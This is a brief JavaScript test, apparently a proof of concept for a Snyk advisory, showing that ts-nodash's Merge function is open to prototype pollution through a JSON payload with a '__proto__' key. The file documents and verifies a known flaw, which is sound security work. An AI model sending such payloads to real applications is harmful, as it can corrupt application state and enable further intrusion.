//https://security.snyk.io/vuln/SNYK-JS-TSNODASH-1311009
test("prototype pollution in ts-nodash", () => {
  const nodash = require("ts-nodash");

  expect({}.polluted).toBe(undefined);

  let obj = {};
  let EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  nodash.Merge({}, EVIL_JSON);

  expect({}.polluted).toBe("yes");
});
